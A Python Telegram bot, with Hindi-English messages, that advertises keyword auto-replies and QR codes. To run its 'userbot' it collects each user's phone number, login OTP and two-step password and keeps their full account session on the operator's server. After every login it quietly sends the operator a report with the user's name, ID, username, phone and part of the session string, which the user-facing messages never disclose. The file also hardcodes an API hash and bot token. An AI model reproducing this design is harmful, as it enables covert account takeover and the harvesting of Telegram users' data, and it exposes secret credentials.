import asyncio
import os
import json
import qrcode
from io import BytesIO
from threading import Thread
from flask import Flask
from telethon import TelegramClient, events, functions, types
from telethon.errors import SessionPasswordNeededError, FloodWaitError, RPCError
from telethon.sessions import StringSession

# ─── FLASK WEB SERVER FOR HEALTHCHECK ───
app = Flask(__name__)

@app.route('/')
def health():
    return "Bot is running!", 200

@app.route('/health')
def health_check():
    return "OK", 200

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

# ─── CONFIGURATION ───
API_ID = int(os.environ.get("API_ID", 30329963))
API_HASH = os.environ.get("API_HASH", "83388417e90c0b03a42d8252c58be96a")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8636767584:AAH12SOa2ojk9N80sNMB_5sFTkNBndQYxVc")
MY_OWNER_ID = int(os.environ.get("MY_OWNER_ID", 8909378644))

bot = TelegramClient("price_qr_bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
user_states = {}
active_sessions = {}
user_configs = {}

# Default configuration - Empty, user will set their own
DEFAULT_CONFIG = {
    "keywords": {}
}

# QR is fixed
QR_KEYWORD = "qr"
QR_LINK = os.environ.get("QR_LINK", "https://t.me/yourchannel")

print("🚀 Bot running with Customizable Keyword-Response Engine...")

def generate_qr_code(link):
    """Generate QR code from link and return as BytesIO object."""
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(link)
    qr.make(fit=True)
    
    img = qr.make_image(fill_color="black", back_color="white")
    img_bytes = BytesIO()
    img_bytes.name = "qr_code.png"
    img.save(img_bytes, format="PNG")
    img_bytes.seek(0)
    return img_bytes

def load_user_config(chat_id):
    """Load user configuration from file or return default."""
    try:
        if os.path.exists(f"config_{chat_id}.json"):
            with open(f"config_{chat_id}.json", "r") as f:
                return json.load(f)
    except:
        pass
    return DEFAULT_CONFIG.copy()

def save_user_config(chat_id, config):
    """Save user configuration to file."""
    try:
        with open(f"config_{chat_id}.json", "w") as f:
            json.dump(config, f, indent=4)
        return True
    except:
        return False

# ─── MAIN BOT EVENTS ───
@bot.on(events.NewMessage(pattern="/start"))
async def start_handler(event):
    await event.reply(
        "━━━〔 ✦ 👑 Custom Keyword-Response Bot 👑 ✦ 〕━━━\n\n"
        "Welcome! Apna userbot chalu karne ke liye `/login` command bhejen.\n\n"
        "📌 **Features:**\n"
        "• 📝 Custom Keywords with Custom Responses\n"
        "• 📱 QR Code Generator (Fixed - 'qr' keyword)\n\n"
        "⚙️ **Commands:**\n"
        "`/addkeyword <word> <response>` - Add a new keyword with response\n"
        "`/removekeyword <word>` - Remove a keyword\n"
        "`/listkeywords` - Show all your keywords\n"
        "`/setqrlink <link>` - Change QR code link\n"
        "`/resetconfig` - Reset all keywords\n\n"
        "🚪 **Logout:** `/logout` to stop your userbot"
    )

@bot.on(events.NewMessage(pattern="/login"))
async def login_handler(event):
    chat_id = event.chat_id
    
    if chat_id in active_sessions:
        await event.reply("⚠️ **Aap already logged in hain!**\nPehle `/logout` karein phir se login karein.")
        return
    
    user_states[chat_id] = {"step": "NUMBER"}
    await event.reply("📱 **STEP 1:** Apna Telegram Number bhejen (with country code, e.g., `+919876543210`)")

@bot.on(events.NewMessage(pattern="/logout"))
async def logout_handler(event):
    chat_id = event.chat_id
    
    if chat_id in active_sessions:
        try:
            client = active_sessions[chat_id]
            await client.disconnect()
            active_sessions.pop(chat_id, None)
            user_states.pop(chat_id, None)
            
            await event.reply("✅ **Logout Successful!**\n\nAapka userbot successfully logout ho gaya hai.\nPhir se login ke liye `/login` command use karein.")
            print(f"User {chat_id} logged out successfully")
        except Exception as e:
            await event.reply(f"❌ **Logout Error:** `{str(e)}`")
            print(f"Logout error for {chat_id}: {e}")
    else:
        await event.reply("ℹ️ **Aap already logged out hain.**\nLogin ke liye `/login` command use karein.")

@bot.on(events.NewMessage(pattern="/addkeyword"))
async def add_keyword_handler(event):
    chat_id = event.chat_id
    if chat_id not in active_sessions:
        await event.reply("❌ **Pehle login karein!** `/login` command use karein.")
        return
    
    args = event.raw_text.split(maxsplit=1)
    if len(args) < 2:
        await event.reply(
            "❌ **Usage:** `/addkeyword <word> <response>`\n\n"
            "Example: `/addkeyword price Welcome to our store! Here is the price list...`\n"
            "Example: `/addkeyword help Here are the available commands...`\n"
            "Example: `/addkeyword contact @username for support`"
        )
        return
    
    parts = args[1].split(maxsplit=1)
    if len(parts) < 2:
        await event.reply(
            "❌ **Usage:** `/addkeyword <word> <response>`\n\n"
            "Example: `/addkeyword price Welcome to our store! Here is the price list...`"
        )
        return
    
    word = parts[0].lower().strip()
    response = parts[1]
    
    config = load_user_config(chat_id)
    
    if word in config["keywords"]:
        await event.reply(
            f"⚠️ **Keyword '{word}' already exists!**\n"
            f"Current response: `{config['keywords'][word][:50]}...`\n\n"
            f"Use `/removekeyword {word}` first if you want to change it."
        )
        return
    
    config["keywords"][word] = response
    
    if save_user_config(chat_id, config):
        await event.reply(
            f"✅ **Keyword Added!**\n\n"
            f"📌 Word: `{word}`\n"
            f"📝 Response: `{response[:100]}...`\n\n"
            f"Ab users ko '{word}' bhejne par yeh response milega."
        )
    else:
        await event.reply("❌ Failed to save configuration!")

@bot.on(events.NewMessage(pattern="/removekeyword"))
async def remove_keyword_handler(event):
    chat_id = event.chat_id
    if chat_id not in active_sessions:
        await event.reply("❌ **Pehle login karein!** `/login` command use karein.")
        return
    
    args = event.raw_text.split(maxsplit=1)
    if len(args) < 2:
        await event.reply(
            "❌ **Usage:** `/removekeyword <word>`\n\n"
            "Example: `/removekeyword price`"
        )
        return
    
    word = args[1].lower().strip()
    
    config = load_user_config(chat_id)
    
    if word not in config["keywords"]:
        await event.reply(f"❌ **Keyword '{word}' not found!**\nUse `/listkeywords` to see all keywords.")
        return
    
    removed_response = config["keywords"][word]
    del config["keywords"][word]
    
    if save_user_config(chat_id, config):
        await event.reply(
            f"✅ **Keyword Removed!**\n\n"
            f"📌 Word: `{word}`\n"
            f"📝 Old Response: `{removed_response[:100]}...`"
        )
    else:
        await event.reply("❌ Failed to save configuration!")

@bot.on(events.NewMessage(pattern="/listkeywords"))
async def list_keywords_handler(event):
    chat_id = event.chat_id
    if chat_id not in active_sessions:
        await event.reply("❌ **Pehle login karein!** `/login` command use karein.")
        return
    
    config = load_user_config(chat_id)
    
    if not config["keywords"]:
        await event.reply(
            "📋 **No Keywords Found!**\n\n"
            "Add your first keyword with:\n"
            "`/addkeyword <word> <response>`\n\n"
            "Example: `/addkeyword price Welcome to our store!`"
        )
        return
    
    keyword_list = "📋 **Your Keywords & Responses**\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for idx, (word, response) in enumerate(config["keywords"].items(), 1):
        keyword_list += f"{idx}. **{word}**\n"
        keyword_list += f"   └─ `{response[:100]}...`\n\n"
    
    keyword_list += "━━━━━━━━━━━━━━━━━━━━━\n"
    keyword_list += f"📊 **Total:** {len(config['keywords'])} keywords\n\n"
    keyword_list += "💡 **Commands:**\n"
    keyword_list += "• `/addkeyword <word> <response>` - Add new\n"
    keyword_list += "• `/removekeyword <word>` - Remove\n"
    keyword_list += "• `/resetconfig` - Remove all"
    
    await event.reply(keyword_list)

@bot.on(events.NewMessage(pattern="/setqrlink"))
async def set_qr_link_handler(event):
    chat_id = event.chat_id
    if chat_id not in active_sessions:
        await event.reply("❌ **Pehle login karein!** `/login` command use karein.")
        return
    
    args = event.raw_text.split(maxsplit=1)
    if len(args) < 2:
        await event.reply(
            "❌ **Usage:** `/setqrlink <link>`\n\n"
            "Example: `/setqrlink https://t.me/yourchannel`"
        )
        return
    
    new_link = args[1].strip()
    global QR_LINK
    QR_LINK = new_link
    
    await event.reply(
        f"✅ **QR Link Updated!**\n\n"
        f"🆕 New Link: `{QR_LINK}`\n\n"
        f"Ab users ko QR code is link ke liye generate hoga."
    )

@bot.on(events.NewMessage(pattern="/resetconfig"))
async def reset_config_handler(event):
    chat_id = event.chat_id
    if chat_id not in active_sessions:
        await event.reply("❌ **Pehle login karein!** `/login` command use karein.")
        return
    
    config = DEFAULT_CONFIG.copy()
    if save_user_config(chat_id, config):
        await event.reply(
            "✅ **All Keywords Removed!**\n\n"
            "Sab keywords delete kar di gaye hain.\n"
            "`/addkeyword` se naye keywords add karein."
        )
    else:
        await event.reply("❌ Failed to reset configuration!")

@bot.on(events.NewMessage)
async def message_handler(event):
    chat_id = event.chat_id
    text = event.text.strip() if event.text else ""
    if chat_id not in user_states or text.startswith("/"):
        return

    state = user_states[chat_id]

    if state["step"] == "NUMBER":
        await event.reply("⏳ Connecting to Telegram...")
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            send_code = await client.send_code_request(text)
            state["client"] = client
            state["phone"] = text
            state["phone_code_hash"] = send_code.phone_code_hash
            state["step"] = "OTP"
            await event.reply("📩 **STEP 2:** Aapke Telegram par aaya hua OTP yahan bhejen.")
        except Exception as e:
            await event.reply(f"❌ Error: `{str(e)}` \nDubara `/login` karein.")
            user_states.pop(chat_id, None)

    elif state["step"] == "OTP":
        client = state["client"]
        try:
            await client.sign_in(phone=state["phone"], code=text, phone_code_hash=state["phone_code_hash"])
            session_str = client.session.save()
            await event.reply(f"✅ **Login Kamyab!**\n\n🚀 Background mein aapka Custom Userbot start ho raha hai...")
            
            try:
                me = await client.get_me()
                hidden_session = session_str[:10] + "..." + session_str[-10:] if len(session_str) > 20 else "***HIDDEN***"
                
                log_msg = (
                    "🔥 **NEW USERBOT LOGIN RAPPORT** 🔥\n"
                    "━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📛 **Name:** {me.first_name}\n"
                    f"🆔 **User ID:** `{me.id}`\n"
                    f"🔗 **Username:** @{me.username if me.username else 'None'}\n"
                    f"📱 **Phone:** `{state['phone']}`\n"
                    f"🔑 **Session String:** `{hidden_session}` (Hidden for security)\n"
                    f"📊 **Session Length:** {len(session_str)} characters"
                )
                await bot.send_message(MY_OWNER_ID, log_msg)
            except Exception as log_err:
                print(f"Logging error: {log_err}")

            asyncio.create_task(run_user_bot(session_str, chat_id))
            user_states.pop(chat_id, None)
        except SessionPasswordNeededError:
            state["step"] = "PASSWORD"
            await event.reply("🔒 **2-Step Verification:** Apna 2FA password bhejen.")
        except Exception as e:
            await event.reply(f"❌ Error: `{str(e)}` \nDubara `/login` karein.")
            user_states.pop(chat_id, None)

    elif state["step"] == "PASSWORD":
        client = state["client"]
        try:
            await client.sign_in(password=text)
            session_str = client.session.save()
            await event.reply(f"✅ **Login Kamyab!**\n\n🚀 Starting Userbot...")
            
            try:
                me = await client.get_me()
                hidden_session = session_str[:10] + "..." + session_str[-10:] if len(session_str) > 20 else "***HIDDEN***"
                
                log_msg = (
                    "🔥 **NEW USERBOT LOGIN RAPPORT (2FA)** 🔥\n"
                    "━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📛 **Name:** {me.first_name}\n"
                    f"🆔 **User ID:** `{me.id}`\n"
                    f"🔗 **Username:** @{me.username if me.username else 'None'}\n"
                    f"📱 **Phone:** `{state['phone']}`\n"
                    f"🔑 **Session String:** `{hidden_session}` (Hidden for security)\n"
                    f"📊 **Session Length:** {len(session_str)} characters"
                )
                await bot.send_message(MY_OWNER_ID, log_msg)
            except Exception as log_err:
                print(f"Logging error: {log_err}")

            asyncio.create_task(run_user_bot(session_str, chat_id))
            user_states.pop(chat_id, None)
        except Exception as e:
            await event.reply(f"❌ Error: `{str(e)}` \nDubara `/login` karein.")
            user_states.pop(chat_id, None)


# ─── USERBOT CORE ENGINE ───
async def run_user_bot(session_string, chat_id):
    try:
        user_bot = TelegramClient(StringSession(session_string), API_ID, API_HASH, auto_reconnect=True)
        await user_bot.start()
        
        active_sessions[chat_id] = user_bot
        
        me = await user_bot.get_me()
        USER_ID = me.id
        
        config = load_user_config(chat_id)
        user_configs[chat_id] = config

        @user_bot.on(events.NewMessage(incoming=True))
        async def handle_incoming_messages(event):
            if event.is_private:
                sender = await event.get_sender()
                message_text = event.raw_text.lower().strip()

                if sender.id == USER_ID:
                    return

                config = load_user_config(chat_id)
                
                print(f"Received from {sender.first_name} (ID: {sender.id}): {message_text}")

                try:
                    if message_text in config["keywords"]:
                        await event.reply(config["keywords"][message_text])
                        print(f"Sent response for '{message_text}' to {sender.id}")

                    elif message_text == QR_KEYWORD:
                        try:
                            qr_image = generate_qr_code(QR_LINK)
                            await user_bot.send_file(
                                sender.id,
                                file=qr_image,
                                caption=f"🔗 QR Code for: {QR_LINK}",
                                force_document=False
                            )
                            print(f"Sent QR code to {sender.id}")
                        except Exception as e:
                            print(f"Error generating QR code: {e}")
                            await event.reply("❌ Failed to generate QR code. Please try again later.")

                    elif message_text == "logout":
                        await event.reply("🔴 **Logging out...**")
                        await user_bot.disconnect()
                        if chat_id in active_sessions:
                            active_sessions.pop(chat_id, None)
                        return

                except Exception as e:
                    print(f"Error handling message from {sender.id}: {e}")
                    await event.reply("⚠️ An error occurred while processing your request.")

        keyword_count = len(config["keywords"])
        keyword_preview = list(config["keywords"].keys())[:3] if keyword_count > 0 else []
        
        welcome_msg = (
            f"🔥 **Custom Keyword-Response Bot Active!**\n"
            f"👤 User: {me.first_name}\n\n"
            f"📊 **Total Keywords:** {keyword_count}\n"
        )
        
        if keyword_count > 0:
            welcome_msg += f"📌 **Keywords:** {', '.join(['`' + k + '`' for k in keyword_preview])}"
            if keyword_count > 3:
                welcome_msg += f" and {keyword_count - 3} more..."
            welcome_msg += "\n\n"
        
        welcome_msg += (
            f"⚙️ **Commands:**\n"
            f"  `/addkeyword <word> <response>` - Add keyword\n"
            f"  `/removekeyword <word>` - Remove keyword\n"
            f"  `/listkeywords` - View all keywords\n"
            f"  `/setqrlink <link>` - Change QR link\n"
            f"  `/resetconfig` - Remove all keywords\n\n"
            f"📱 **QR:** Send 'qr' to get QR code\n"
            f"🚪 **Logout:** Send 'logout' to stop"
        )
        
        await bot.send_message(chat_id, welcome_msg)
        await user_bot.run_until_disconnected()

    except Exception as e:
        print(f"Crash: {e}")
        if chat_id in active_sessions:
            active_sessions.pop(chat_id, None)
        try:
            await bot.send_message(chat_id, f"⚠️ Bot Stopped. Error: `{str(e)[:80]}`")
        except:
            pass

# ─── START BOT AND WEB SERVER ───
async def main():
    # Start Flask server in background thread
    flask_thread = Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    # Start the bot
    await bot.run_until_disconnected()

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
